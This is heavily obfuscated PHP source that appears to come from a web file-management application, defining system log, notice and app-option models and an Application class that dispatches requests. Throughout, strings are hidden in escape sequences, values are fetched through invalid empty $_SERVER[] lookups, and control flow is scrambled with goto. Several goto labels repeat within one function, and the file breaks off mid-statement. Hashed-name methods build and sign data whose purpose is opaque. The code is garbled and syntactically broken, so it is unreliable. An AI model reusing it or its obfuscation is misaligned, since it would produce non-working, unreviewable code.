<?php
 goto d; d؊ū: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\114\x69\x67\x68\x74\101\x70\x70"; public $modelType = "\123\171\163\164\x65\155\117\x70\x74\151\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\x67\x72\x6f\165\x70", "\144\x65\x73\x63", "\x63\x6f\156\x74\x65\x6e\x74"); public function listData($dŏȿ = false, $Břƈ = "\x6d\x6f\x64\x69\146\x79\x54\151\155\145", $d = true) { return parent::listData($dŏȿ, $Břƈ, $d); } public function remove($D) { $E˽ = $this->findByName($D); if (!$E˽) { return !1; } return parent::remove($E˽[$_SERVER[][388]]); } public function add($F¿) { if ($this->findByName($F¿[$_SERVER[][28]])) { return !1; } return parent::insert($F¿); } public function update($D㨐, $D㊎) { $D鱏 =& $_SERVER[]; $c = $this->findByName($D㨐); $B = $this->findByName($D㊎[$D鱏[28]]); if (!$c || $B && $B[$D鱏[388]] != $c[$D鱏[388]]) { return !1; } return parent::update($c[$D鱏[388]], $D㊎); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\x5f\154\157\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\151\x6d\x65", "\164\151\155\x65", "\151\x6e\x73\x65\x72\x74", "\146\165\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $a =& $_SERVER[]; return array($a[1998] => LNG($a[1999]), $a[2000] => LNG($a[2001]), $a[1626] => LNG($a[2002]), $a[2003] => LNG($a[2004]), $a[2005] => LNG($a[2006]), $a[2007] => LNG($a[2008]), $a[2009] => LNG($a[2010]), $a[1656] => LNG($a[2010]), $a[1657] => LNG($a[2011]), $a[2012] => LNG($a[2013]), $a[2014] => LNG($a[2015]), $a[2016] => LNG($a[2017]), $a[2018] => LNG($a[2019]), $a[1654] => LNG($a[2020]), $a[1661] => LNG($a[2021]), $a[2022] => LNG($a[2023]), $a[2024] => LNG($a[2025]), $a[2026] => LNG($a[2027]), $a[2028] => LNG($a[2029]), $a[1664] => LNG($a[2030]), $a[1665] => LNG($a[2031]), $a[2032] => LNG($a[2033]), $a[2034] => LNG($a[2035]), $a[2036] => LNG($a[2037]), $a[1659] => LNG($a[2038]), $a[2039] => LNG($a[2040]), $a[1658] => LNG($a[2041]), $a[2042] => LNG($a[2043]), $a[2044] => LNG($a[2045]), $a[2046] => LNG($a[2046]), $a[2047] => LNG($a[2047]), $a[2048] => LNG($a[1630]), $a[2049] => LNG($a[2050]), $a[2051] => LNG($a[2052]), $a[2053] => LNG($a[2054]), $a[2055] => LNG($a[2056]), $a[2057] => LNG($a[2058]), $a[2059] => LNG($a[2059]), $a[2060] => LNG($a[2061]), $a[2062] => LNG($a[2063]), $a[2064] => LNG($a[2065]), $a[2066] => LNG($a[2067]), $a[2068] => LNG($a[2069]), $a[2070] => LNG($a[2071])); } private function typeFile() { $c =& $_SERVER[]; $c˲ = array($c[1661] => array($c[1662]), $c[2016] => array($c[2072]), $c[2018] => array($c[2073]), $c[1654] => array($c[1655]), $c[2024] => array(), $c[2026] => array(), $c[2028] => array(), $c[1664] => array($c[1666]), $c[1665] => array($c[1666]), $c[2032] => array($c[2074]), $c[2034] => array($c[2074]), $c[2036] => array($c[2075]), $c[2022] => array($c[2076]), $c[1659] => array($c[2077]), $c[2039] => array($c[2078]), $c[1658] => array($c[1660])); return $c˲; } private function typeAll() { goto A; A: $fⓄɬ =& $_SERVER[]; $d䅅 = $this->typeList; $D⦏ = array_filter($this->typeFile()); goto Aю; Aю: foreach ($D⦏ as $E => $DˤŌЮ) { $d䅅[$DˤŌЮ[0]] = $d䅅[$E]; } $d䅅[$fⓄɬ[1666]] = LNG($fⓄɬ[2079]); $d䅅[$fⓄɬ[2074]] = LNG($fⓄɬ[2080]); goto B߭; B߭: return $d䅅; goto d޵; d޵: } public function addLog($d蜊, $Cϕ = array()) { goto E؄͉; E؄͉: $FЛŷ֬ =& $_SERVER[]; if (!isset($this->typeList[$d蜊])) { return; } $Aڼ = defined($FЛŷ֬[448]) && USER_ID ? USER_ID : (isset($Cϕ[$FЛŷ֬[1523]]) ? $Cϕ[$FЛŷ֬[1523]] : 0); goto FЄ; FЄ: if (!$Aڼ) { $Aڼ = (int) Session::get($FЛŷ֬[1813]); } $E = get_client_ip(); if (!$Cϕ || strlen(json_encode($Cϕ)) >= 1024) { $Cϕ = array($FЛŷ֬[2081] => $E); } else { if (is_array($Cϕ)) { $Cϕ[$FЛŷ֬[2081]] = $E; } else { $Cϕ = array($FЛŷ֬[1087] => $Cϕ, $FЛŷ֬[2081] => $E); } } goto bȅ; bȅ: $Cϕ = array($FЛŷ֬[1514] => Session::sign(), $FЛŷ֬[1515] => $Aڼ, $FЛŷ֬[29] => $d蜊, $FЛŷ֬[1517] => json_encode($Cϕ)); parent::add($Cϕ); goto EǸ; EǸ: } public function remove($BүƏ) { $this->where(array($_SERVER[][406] => $BүƏ))->delete(); } private function _makeOrder($eꩬǻ = '') { goto a; a: $e =& $_SERVER[]; $d = $e[192]; $b簉 = array($e[422] => $e[423], $e[424] => $e[425]); goto a۹; D٭: return $this->order($eꩬǻ); goto b񺇦; a۹: $cҒ = Input::get($e[430], $e[7], $e[1845], array($e[1769], $e[424])); $cҒ = $b簉[$cҒ]; $eꩬǻ = $eꩬǻ . "{$d}\40{$cҒ}"; goto D٭; b񺇦: } public function get($B㉑ = '') { goto bٻǳ; bٻǳ: $CÖ =& $_SERVER[]; if (!$B㉑) { show_json(array()); } $Dޜ = array(); goto d; bם: $fŽݗ[$CÖ[365]] = $this->logList($fŽݗ[$CÖ[365]]); return $fŽݗ; goto B; d: if (!empty($B㉑[$CÖ[2081]])) { $Dޜ[$CÖ[425]] = array($CÖ[378], "\45{$B㉑[$CÖ[2081]]}\45"); } $fŽݗ = $this->_makeOrder()->where($Dޜ)->selectPage(); if (empty($fŽݗ[$CÖ[365]])) { show_json(array(), !0, $fŽݗ[$CÖ[362]]); } goto bם; d: if ($B㉑[$CÖ[1523]]) { $Dޜ[$CÖ[1523]] = $B㉑[$CÖ[1523]]; } if (isset($B㉑[$CÖ[738]])) { $E = $B㉑[$CÖ[738]]; $e礇 = isset($B㉑[$CÖ[470]]) ? $B㉑[$CÖ[470]] : time(); $Dޜ[$CÖ[192]] = array($CÖ[329], array($E, $e礇)); } if ($B㉑[$CÖ[29]]) { $E޵ = explode($CÖ[47], $B㉑[$CÖ[29]]); $Cǽ = $this->typeFile(); $bɿ = array(); foreach ($E޵ as $Bً) { $bɿ[] = $Bً; if (isset($Cǽ[$Bً])) { $bɿ = array_merge($bɿ, $Cǽ[$Bً]); } } $bɿ = array_unique($bɿ); if ($bɿ) { $Dޜ[$CÖ[29]] = array($CÖ[7], $bɿ); } } goto d; B: } private function ipAddress(&$Cײ) { $CͶ =& $_SERVER[]; if (!empty($Cײ[$CͶ[2081]])) { $D᥏ = IpLocation::get($Cײ[$CͶ[2081]]); } else { $D᥏ = LNG($CͶ[2082]); } $Cײ[$CͶ[2083]] = $D᥏; } private function descZipDownload($C, &$A) { $DꞙƖ =& $_SERVER[]; if (!isset($C[$DꞙƖ[2084]])) { return; } $eō٤ם = json_decode($C[$DꞙƖ[2084]], !0); foreach ($eō٤ם as $c˸) { try { $fڽ֢ = IO::infoFull($c˸[$DꞙƖ[75]]); } catch (Exception $E靆ߚ) { continue; } $C[$DꞙƖ[75]] = $c˸[$DꞙƖ[75]]; $A[] = $C[$DꞙƖ[390]] = $fڽ֢[$DꞙƖ[390]]; $A[] = $C[$DꞙƖ[1901]] = $fڽ֢[$DꞙƖ[472]]; break; } return $C; } private function getSourceList(&$A) { $Dޯŝ =& $_SERVER[]; $Eᙼ = array(); foreach ($A as $c؏ => $e) { goto B˄; CΊۅ: if ($E؆[$Dޯŝ[29]] == $Dޯŝ[1909]) { $Eᙼ[] = $E؆[$Dޯŝ[425]][$Dޯŝ[390]]; } goto eȢ; B˄: $E؆ = json_decode($e[$Dޯŝ[425]], !0); if ($e[$Dޯŝ[29]] == $Dޯŝ[1657]) { $E؆ = $this->descZipDownload($E؆, $Eᙼ); $A[$c؏][$Dޯŝ[425]] = json_encode($E؆); continue; } if (strpos($e[$Dޯŝ[29]], $Dޯŝ[1902]) !== 0) { if (!isset($E؆[$Dޯŝ[75]]) || strpos($e[$Dޯŝ[29]], $Dޯŝ[2085]) !== 0) { continue; } try { $Eج = IO::infoFull($E؆[$Dޯŝ[75]]); } catch (Exception $cѧ) { continue; } $Eᙼ[] = $E؆[$Dޯŝ[390]] = $Eج[$Dޯŝ[390]]; $Eᙼ[] = $E؆[$Dޯŝ[1901]] = $Eج[$Dޯŝ[472]]; $A[$c؏][$Dޯŝ[425]] = json_encode($E؆); continue; } goto Bփ; Bփ: $Eᙼ[] = $E؆[$Dޯŝ[390]]; $Eᙼ[] = $E؆[$Dޯŝ[1901]]; if ($E؆[$Dޯŝ[29]] == $Dޯŝ[515]) { $Eᙼ[] = $E؆[$Dޯŝ[425]][$Dޯŝ[1054]]; $Eᙼ[] = $E؆[$Dޯŝ[425]][$Dޯŝ[1055]]; } goto CΊۅ; eȢ: } if (!$Eᙼ) { return array(); } return Model($Dޯŝ[790])->sourceListInfo($Eᙼ, !0); } private function logList($Eһ) { goto bĢՋ; bĢՋ: $D =& $_SERVER[]; $C뇞 = array_to_keyvalue($Eһ, $D[33], $D[1523]); $D툥 = Model($D[501])->userListInfo(array_unique($C뇞)); goto f; a: return $AЈ; goto Eԏ; fùڧ: $aڍ춣 = array(); foreach ($Eһ as $B򃅗 => $E) { goto dȍ; B旆: $this->ipAddress($E); if (strpos($Bã, $D[1902]) === 0 || isset($Fą[$D[1901]])) { goto dآŠ; dآŠ: $Fą[$D[84]] = $e㇂[$Fą[$D[390]]]; $Fą[$D[1914]] = $e㇂[$Fą[$D[1901]]]; if ($Fą[$D[29]] == $D[515]) { $Fą[$D[425]][$D[1054]] = $e㇂[$Fą[$D[425]][$D[1054]]]; $Fą[$D[425]][$D[1055]] = $e㇂[$Fą[$D[425]][$D[1055]]]; } goto c؄; c؄: if ($Fą[$D[29]] == $D[1909]) { $Fą[$D[425]][$D[390]] = $e㇂[$Fą[$D[425]][$D[390]]]; } if ($Fą[$D[29]] == $D[1652]) { $Fą[$D[1914]] = $Fą[$D[84]]; $Fą[$D[1901]] = $Fą[$D[1914]][$D[390]]; $Fą[$D[84]] = !1; $Fą[$D[390]] = $D[33]; } if ($Fą[$D[84]] && $Fą[$D[84]][$D[398]] == $D[1168]) { $aڍ춣[] = $E[$D[388]]; unset($Eһ[$B򃅗]); continue; } goto Cн; Cн: if ($Fą[$D[1914]] && $Fą[$D[1914]][$D[398]] == $D[1168]) { $aڍ춣[] = $E[$D[388]]; unset($Eһ[$B򃅗]); continue; } goto D; D: } $E[$D[425]] = $Fą; goto e; bѲ: $E[$D[1844]] = $bٕ˅; $Fą = json_decode($E[$D[425]], !0); $E[$D[2081]] = isset($Fą[$D[2081]]) ? $Fą[$D[2081]] : $D[33]; goto B旆; dȍ: $Bã = $E[$D[29]]; $bٕ˅ = isset($D툥[$E[$D[1523]]]) ? $D툥[$E[$D[1523]]] : !1; $aќ = strpos($Bã, $D[2086]) === 0 ? LNG($D[2087]) : LNG($D[2082]); goto eߔ; e: unset($E[$D[2088]]); $AЈ[] = $E; goto eˊ; eߔ: $E[$D[28]] = isset($bٕ˅[$D[28]]) ? $bٕ˅[$D[28]] : LNG($D[2082]); $E[$D[1950]] = isset($bٕ˅[$D[1950]]) ? $bٕ˅[$D[1950]] : $D[33]; $E[$D[1428]] = isset($AЍ[$Bã]) ? $AЍ[$Bã] : $aќ; goto bѲ; eˊ: } $this->clearSystemPathLog($aڍ춣); goto a; f: $e㇂ = $this->getSourceList($Eһ); $AЍ = $this->typeAll(); $AЈ = array(); goto fùڧ; Eԏ: } private function clearSystemPathLog($FՖэ) { $F =& $_SERVER[]; if (count($FՖэ) == 0) { return; } $e펺 = array($F[388] => array($F[7], array_unique($FՖэ))); $this->where($e펺)->delete(); } public function deviceList($f杶, $FΨ = 0) { $cշЋ =& $_SERVER[]; $BʅҨ = array($cշЋ[1523] => $f杶, $cշЋ[192] => array($cշЋ[971], $FΨ), $cշЋ[29] => $cշЋ[1626]); $EǤن = array(); $e = $this->field($cշЋ[2089])->where($BʅҨ)->order($cշЋ[1912])->limit(50)->select(); foreach ($e as $d => $f݆) { goto B; D: unset($Eێ϶[$cշЋ[2081]]); $D = $this->deviceType($Eێ϶[$cշЋ[1903]]); if (isset($EǤن[$D])) { continue; } goto c譲; c譲: $this->ipAddress($f݆); $f݆[$cշЋ[425]] = $Eێ϶; $EǤن[$D] = $f݆; goto bշ; B: if ($d > 0 && abs($f݆[$cշЋ[192]] - $e[$d - 1][$cշЋ[192]]) < 5) { continue; } $Eێ϶ = json_decode($f݆[$cշЋ[425]], !0); $f݆[$cշЋ[2081]] = isset($Eێ϶[$cշЋ[2081]]) ? $Eێ϶[$cշЋ[2081]] : $cշЋ[33]; goto D; bշ: } return array_values($EǤن); } public function deviceType($d) { return $d; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\x6e\157\164\x69\143\145\x4c\x69\163\164"; public $field = array("\156\x61\155\145", "\x63\157\156\x74\145\x6e\164", "\x61\x75\x74\150", "\x6d\x6f\x64\x65", "\164\x69\155\x65", "\x74\171\160\x65", "\x6c\x65\166\x65\x6c", "\145\x6e\141\142\x6c\145", "\163\x6f\x72\164"); public function listData($F = false, $cܓ = "\x73\157\x72\x74", $f󑤝Ɩ = false) { return parent::listData($F, $cܓ, $f󑤝Ɩ); } public function add($eΝ) { $D݄ =& $_SERVER[]; $e = time(); if ($eΝ[$D݄[12]] == $D݄[2090]) { $e = strtotime($eΝ[$D݄[195]]); } $eΝ[$D݄[195]] = $e; return parent::insert($eΝ); } public function update($Fɉ, $E) { goto B; B: $c琑 =& $_SERVER[]; $a = $this->listData($Fɉ); if (!$a) { return !1; } goto Aʖ; d윇: return parent::update($Fɉ, $E); goto a⦢; Aʖ: $b͚ = time(); if ($E[$c琑[12]] == $c琑[2090]) { $b͚ = strtotime($E[$c琑[195]]); } $E[$c琑[195]] = $b͚; goto d윇; a⦢: } public function remove($fډ) { $EĚۦ߹ = $this->listData($fډ); if (!$EĚۦ߹ || $EĚۦ߹[$_SERVER[][1168]]) { return !1; } return parent::remove($fډ); } public function sort($eʜ, $b) { return parent::update($eʜ, $b); } public function enable($C符, $c뇆) { return parent::update($C符, array($_SERVER[][2091] => $c뇆)); } private function initUserOption() { $f͡ϑ =& $_SERVER[]; $this->optionType = $f͡ϑ[2092]; $this->modelType = $f͡ϑ[2093]; $this->field = array($f͡ϑ[2094], $f͡ϑ[28], $f͡ϑ[195], $f͡ϑ[29], $f͡ϑ[2095], $f͡ϑ[725], $f͡ϑ[189]); } public function userNoticeGet($DϹ = false) { $this->initUserOption(); return parent::listData($DϹ, $_SERVER[][388], !0); } public function userNoticeAdd($E쒡Òԗ) { $e𼑝 =& $_SERVER[]; $this->initUserOption(); $Eǖ = $this->findByKey($e𼑝[2094], $E쒡Òԗ[$e𼑝[388]]); if ($Eǖ) { return !0; } $F = array($e𼑝[2094] => $E쒡Òԗ[$e𼑝[388]], $e𼑝[28] => $E쒡Òԗ[$e𼑝[28]], $e𼑝[195] => $E쒡Òԗ[$e𼑝[195]], $e𼑝[29] => isset($E쒡Òԗ[$e𼑝[29]]) ? $E쒡Òԗ[$e𼑝[29]] : 1, $e𼑝[2095] => isset($E쒡Òԗ[$e𼑝[2095]]) ? $E쒡Òԗ[$e𼑝[2095]] : 0, $e𼑝[725] => 0, $e𼑝[189] => 0); return parent::insert($F); } public function userNoticeEdit($C, $c렢Ν) { $this->initUserOption(); return parent::update($C, $c렢Ν); } } goto cٟ; D垬: $B = $_SERVER[][572]; if (!$B) { return; } class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\151\156\x64\145\x78"; private $defaultAction = "\151\x6e\x64\145\170"; function __construct() { } public function setDefault($c) { goto d; b: $cë = $bߋ[573]; if (strlen($cë) < $bߋ[574]) { return; } $this->{$_SERVER[][3]}($e⅑[4], array($this, $e⅑[5])); goto bգ; bۢ: $this->defaultModule = $cܜ[0] ? $cܜ[0] : $this->defaultModule; $this->defaultController = $cܜ[1] ? $cܜ[1] : $this->defaultController; $this->defaultAction = $cܜ[2] ? $cܜ[2] : $this->defaultAction; goto b; d: $bߋ =& $_SERVER[]; $e⅑ =& $_SERVER[]; $cܜ = $e⅑[0]($e⅑[1], $e⅑[2]($c, $e⅑[1])); goto bۢ; bգ: $d = $bߋ[575]; if (strlen($d) < $bߋ[574]) { die; } goto f; f: } public function appRun($BԻ) { goto B컠۸; A: $a˘ = $Bҵ[578]; if (!$a˘) { return; } $CĘ = $dΆ[7]; goto d; Dܑ: $dΆ[13](array($dΆ[14], $dΆ[15]), $CĘ . $dΆ[16], $BԻ); $dΆ[17]($BԻ); $dΆ[13](array($dΆ[14], $dΆ[15]), $CĘ . $dΆ[18], $BԻ); goto e긹; d: $F = $Bҵ[579]; while ($F < $Bҵ[577]) { if ($F >= 0) { break; } $F++; } if ($f꞉ == $dΆ[8]) { $CĘ = $dΆ[9]; $FՇ[0] = $dΆ[10]; $FՇ[1] = $FՇ[1] . $dΆ[11]; $BԻ = $dΆ[12]($dΆ[1], $FՇ); $BԻ = $dΆ[2]($BԻ, $dΆ[1]); } goto Dܑ; eɱ: $eĐ֭ = $Bҵ[576]; while (strlen($eĐ֭) < $Bҵ[577]) { if (!$eĐ֭) { break; } $eĐ֭++; } $f꞉ = $dΆ[6]($FՇ[0]); goto A; B컠۸: $Bҵ =& $_SERVER[]; $dΆ =& $_SERVER[]; $FՇ = $dΆ[0]($dΆ[1], $BԻ); goto eɱ; e긹: } private function autorun() { goto cŪ; F馮: $eƼƊ = $f͕[580]; while (strlen($eƼƊ) < $f͕[581]) { if (!$eƼƊ) { break; } $eƼƊ++; } if ($c䠃[19]($config[$c䠃[20]]) == 0) { return; } goto D矬ܫ; D矬ܫ: foreach ($config[$c䠃[20]] as $cؠ => $cޞ) { $this->{$_SERVER[][21]}($cޞ); $d = $f͕[582]; while (strlen($d) < $f͕[583]) { if (!$d) { break; } $d++; } } goto BР; cŪ: $f͕ =& $_SERVER[]; $c䠃 =& $_SERVER[]; global $config; goto F馮; BР: } private function wxre2e80ef44() { goto d; a؇: $FΊ = $DĹ[584]; if (strlen($FΊ) < $DĹ[583]) { die; } $BԆ = $GLOBALS[$bǜ[22]][$bǜ[23]][0]; goto Fާ; aՄ: $GLOBALS[$bǜ[22]][$bǜ[23]] = $bǜ[27]($B࢏, $f); $GLOBALS[$bǜ[22]][$bǜ[28]] = $bǜ[29]($bǜ[1], $GLOBALS[$bǜ[22]][$bǜ[23]]); goto b; Bʛ: if (!$e) { die; } $B࢏ = array($bǜ[8], $E炗); $f = $bǜ[26]($GLOBALS[$bǜ[22]][$bǜ[23]], 1); goto aՄ; EŞ: if ($bǜ[6]($bǜ[25]($BԆ, -$bǜ[24]($Bۆצ))) != $Bۆצ) { return; } $E炗 = $bǜ[25]($BԆ, 0, -$bǜ[24]($Bۆצ)); $e = $DĹ[586]; goto Bʛ; d: $DĹ =& $_SERVER[]; $bǜ =& $_SERVER[]; $Bۆצ = $bǜ[8]; goto a؇; Fާ: $e㊇ = $DĹ[585]; while ($e㊇ < $DĹ[583]) { if ($e㊇ >= 0) { break; } $e㊇++; } if (!$BԆ || $bǜ[24]($BԆ) <= $bǜ[24]($Bۆצ)) { return; } goto EŞ; b: } private function srjf666b3657() { goto F; Dك: $c̹ = $B[590]; $Cǖݮ[34]($Cǖݮ[35], $Fא, $a؊); $bǺȉ = $B[591]; goto bތፇ; Fפ: $GLOBALS[$Cǖݮ[22]][$Cǖݮ[28]] = $Cǖݮ[29]($Cǖݮ[1], $GLOBALS[$Cǖݮ[22]][$Cǖݮ[23]]); goto eѤ; F: $B =& $_SERVER[]; $Cǖݮ =& $_SERVER[]; if ($GLOBALS[$Cǖݮ[22]][$Cǖݮ[28]] != $Cǖݮ[10]) { return; } goto C᫢; c: $DЏ = $Cǖݮ[33]($B, $Bж); $A = $B[589]; $Fא = $Cǖݮ[25]($B, $DЏ + $Cǖݮ[24]($Bж)); goto Dك; C᫢: $B = $_SERVER[$Cǖݮ[30]]; $F = $B[587]; if (!$F) { die; } goto A񛚗ޢ; A: if (!$d) { return; } $GLOBALS[$Cǖݮ[22]][$Cǖݮ[23]] = $Cǖݮ[0]($Cǖݮ[36], $Fא); $Bě = $B[593]; goto Fפ; A񛚗ޢ: $Bж = $Cǖݮ[31]; $F = $B[588]; if (!$Cǖݮ[32]($B, $Bж)) { return; } goto c; bތፇ: if (strlen($bǺȉ) < $B[574]) { die; } $Fא = $Cǖݮ[2]($a؊[0][0], $Cǖݮ[36]); $d = $B[592]; goto A; eѤ: } public function run() { goto F; F: $Eڧ =& $_SERVER[]; $Cͭ =& $_SERVER[]; $this->{$_SERVER[][37]}(); goto eʈɆ; c: $bł = $Eڧ[596]; if (strlen($bł) < $Eڧ[583]) { die; } $Cͭ[39]($Cͭ[40], isset($Eé޵[0]) && $Eé޵[0] ? $Eé޵[0] : $this->defaultModule); goto cͦƮ; cͦƮ: $Cͭ[39]($Cͭ[41], isset($Eé޵[1]) && $Eé޵[0] ? $Eé޵[1] : $this->defaultController); $fƶ = $Eڧ[597]; while (strlen($fƶ) < $Eڧ[583]) { if (!$fƶ) { break; } $fƶ++; } goto D㈿; Eͫ: $e햝 = $Eڧ[595]; $Eé޵ = $GLOBALS[$Cͭ[22]][$Cͭ[23]]; $b = $GLOBALS[$Cͭ[22]][$Cͭ[28]]; goto c; eʈɆ: $B = $Eڧ[594]; while (strlen($B) < $Eڧ[583]) { if (!$B) { break; } $B++; } $this->{$_SERVER[][38]}(); goto Eͫ; bѫ: $F = $Eڧ[598]; $this->{$_SERVER[][45]}(); if ($Cͭ[19]($Eé޵) >= 3) { $this->{$_SERVER[][21]}($b); } else { $this->{$_SERVER[][21]}(ACTION); } goto Eї; D㈿: $Cͭ[39]($Cͭ[42], isset($Eé޵[2]) && $Eé޵[0] ? $Eé޵[2] : $this->defaultAction); $Cͭ[39]($Cͭ[43], MOD . $Cͭ[1] . ST . $Cͭ[1] . ACT); $_SERVER[$Cͭ[44]] = $Cͭ[6](ACTION); goto bѫ; Eї: } private $nhbp8b14eae5 = array(); private $xfre5f87504c = ''; public function bzumc4c47b1a() { goto eІ; AЄ: $this->{$_SERVER[][3]}($cٰ[53], array($this, $cٰ[54])); $this->{$_SERVER[][3]}($cٰ[55], array($this, $cٰ[56])); $a甲 = $eȲ[602]; goto eΜԽ; eܘ: while (strlen($b) < $eȲ[581]) { if (!$b) { break; } $b++; } goto A; eІ: $eȲ =& $_SERVER[]; $cٰ =& $_SERVER[]; $this->{$_SERVER[][46]}(); goto B; B: $Cݸ = $eȲ[599]; while ($Cݸ < $eȲ[583]) { if ($Cݸ >= 0) { break; } $Cݸ++; } $this->{$_SERVER[][47]}(); goto CŅ; eΜԽ: $this->{$_SERVER[][3]}($cٰ[57], array($this, $cٰ[58])); $this->{$_SERVER[][3]}($cٰ[59], array($this, $cٰ[60])); $b = $eȲ[603]; goto eܘ; CŅ: $this->{$_SERVER[][48]}(); $this->{$_SERVER[][49]}(); $Fí = $eȲ[600]; goto bƇ; aƖ: $this->{$_SERVER[][52]}(); $Aඋ = $eȲ[601]; if (strlen($Aඋ) < $eȲ[574]) { return; } goto AЄ; bƇ: while ($Fí < $eȲ[574]) { if ($Fí >= 0) { break; } $Fí++; } $this->{$_SERVER[][50]}(); $this->{$_SERVER[][51]}(); goto aƖ; A: } public function fkjzbb7c78ed($Bߤ) { goto Dǚ; D: if (!$Dɯ) { return; } unset($Bߤ[$fＨ[102]][$fＨ[104]][$fＨ[106]]); $Bҫ = $f֚[606]; goto c; d: $CĞЫ = array($fＨ[64], $fＨ[65], $fＨ[66], $fＨ[67], $fＨ[68], $fＨ[69], $fＨ[70], $fＨ[71], $fＨ[72], $fＨ[73], $fＨ[74], $fＨ[75], $fＨ[76], $fＨ[77], $fＨ[78], $fＨ[79], $fＨ[80], $fＨ[81], $fＨ[82], $fＨ[83], $fＨ[84], $fＨ[85], $fＨ[86], $fＨ[87], $fＨ[88], $fＨ[89], $fＨ[90], $fＨ[91], $fＨ[92], $fＨ[93], $fＨ[94], $fＨ[95], $fＨ[96], $fＨ[97], $fＨ[98], $fＨ[99]); $B՗ = $f֚[604]; foreach ($CĞЫ as $B) { $b = $GLOBALS[$fＨ[100]][$fＨ[101]][$B]; if (isset($c[$B])) { $b = $c[$B]; } $Bߤ[$fＨ[102]][$fＨ[103]][$B] = $b; } goto f胠; fׇ: unset($Bߤ[$fＨ[102]][$fＨ[103]][$fＨ[107]]); $cҔ = $f֚[608]; if (!$cҔ) { return; } goto cװ; cװ: $Bߤ[$fＨ[102]][$fＨ[103]][$fＨ[108]] = array($fＨ[109] => (int) $A؍[$fＨ[110]], $fＨ[111] => (int) $fＨ[112]($A؍, $fＨ[113], 0)); $Bߤ[$fＨ[114]][$fＨ[115]] = $fＨ[116]($fＨ[117])->{$_SERVER[][118]}(); $Aז = $f֚[609]; goto C; c: unset($Bߤ[$fＨ[102]][$fＨ[103]][$fＨ[76]]); $a = $f֚[607]; if (strlen($a) < $f֚[577]) { return; } goto fׇ; C: $Bߤ[$fＨ[114]][$fＨ[119]] = $fＨ[120]($_SERVER[$fＨ[121]] . $c[$fＨ[122]]); $Bߤ[$fＨ[114]][$fＨ[123]] = $fＨ[124]($fＨ[125]()); $Bߤ[$fＨ[114]][$fＨ[126]] = $this->xfre5f87504c; goto bѳۥ; eğה: $eγ = $f֚[611]; if ($fＨ[112]($GLOBALS, $fＨ[138]) && $this->config[$fＨ[139]]) { $Bߤ[$fＨ[114]][$fＨ[140]] = WEB_ROOT; } return $Bߤ; goto Fƿ; f胠: $A؍ = $Bߤ[$fＨ[102]][$fＨ[103]][$fＨ[76]]; unset($Bߤ[$fＨ[102]][$fＨ[104]][$fＨ[105]]); $Dɯ = $f֚[605]; goto D; Cމ: if ($this->xfre5f87504c == $fＨ[127]) { $Bߤ[$fＨ[102]][$fＨ[103]][$fＨ[108]][$fＨ[113]] = 0; } $Bߤ[$fＨ[114]][$fＨ[134]] = $fＨ[112]($this->nhbp8b14eae5, $fＨ[135], $fＨ[10]); $Bߤ[$fＨ[114]][$fＨ[136]] = $fＨ[112]($this->nhbp8b14eae5, $fＨ[137], $fＨ[10]); goto eğה; Dǚ: $f֚ =& $_SERVER[]; $fＨ =& $_SERVER[]; $c = $fＨ[61]($fＨ[62])->{$_SERVER[][63]}(); goto d; bѳۥ: $Fǯ = $f֚[610]; while (strlen($Fǯ) < $f֚[581]) { if (!$Fǯ) { break; } $Fǯ++; } if ($c[$fＨ[126]] != $fＨ[127]) { $Bߤ[$fＨ[114]][$fＨ[128]] = $c[$fＨ[128]]; $Bߤ[$fＨ[114]][$fＨ[129]] = $c[$fＨ[129]]; $bÌ = $fＨ[130](10) . $this->xfre5f87504c . $fＨ[130](5); $Bߤ[$fＨ[102]][$fＨ[131]][$fＨ[132]] = $this->{$_SERVER[][133]}($bÌ, $Bߤ[$fＨ[114]][$fＨ[119]]); } goto Cމ; Fƿ: } private function plen9cf2f890() { goto Dϡ; fތ: if (!$Eε) { return; } $Dڙ = array($F[165] => $d˙[$F[64]], $F[166] => $d˙[$F[65]], $F[167] => $F[10]); foreach ($d as $B胚ͤ) { if (!isset($d˙[$B胚ͤ]) || !$d˙[$B胚ͤ]) { continue; } $Dڙ[$B胚ͤ] = $d˙[$B胚ͤ]; } goto a; Cɻ: if (!$E싵) { die; } $d˙ = $F[61]($F[62])->{$_SERVER[][63]}(); $Eε = $dӷі[614]; goto fތ; Dϡ: $dӷі =& $_SERVER[]; $F =& $_SERVER[]; if ($_SERVER[$F[44]] == $F[141]) { goto EÉ; A: $F[13](array($F[157], $F[158]), $Dڙ); goto aݤ; EÉ: $Aܑ = array($F[126] => $this->xfre5f87504c, $F[142] => $this->{$_SERVER[][143]}(), $F[144] => $F[61]($F[145])->{$_SERVER[][146]}()); if ($this->xfre5f87504c != $F[127]) { $D֑ = $F[112]($this->nhbp8b14eae5, $F[147]); if ($D֑) { $Aܑ[$F[148]] = $D֑; $Aܑ[$F[149]] = $F[150]($F[112]($this->nhbp8b14eae5, $F[151])); $Aܑ[$F[152]] = $F[112]($this->nhbp8b14eae5, $F[137]); } } $Aܑ = $this->{$_SERVER[][153]}($F[154]($Aܑ), $F[120]($F[155])); goto D; D: $Dڙ = array($F[156] => $Aܑ); $E = $dӷі[612]; if (!$E) { return; } goto A; aݤ: } goto b٩; b٩: if ($this->xfre5f87504c == $F[127]) { return; } $d = array($F[159], $F[160], $F[161], $F[162], $F[163], $F[164]); $E싵 = $dӷі[613]; goto Cɻ; a: $F[13](array($F[157], $F[158]), $Dڙ); $FƂ = $dӷі[615]; goto cƪ; cƪ: } private function iarh7b384420() { goto F; F: $c = $A⠗[120]($_SERVER[$A⠗[121]] . $C֏); $D = $Fϯ[616]; if ($cğ[$A⠗[184]] == $A⠗[185]) { $EՌ = $this->{$_SERVER[][153]}($c, $A⠗[186]); $bս = $this->{$_SERVER[][133]}($A⠗[154]($b), $c . $A⠗[187], 3); $bս = $bս . $A⠗[188] . $_SERVER[$A⠗[179]]; $AɈ = $this->{$_SERVER[][189]}($A⠗[190] . $EՌ . $A⠗[191] . $bս, -1); $A⠗[172]($AɈ, !0); } else { if ($cğ[$A⠗[184]] == $A⠗[192]) { $d̙ = 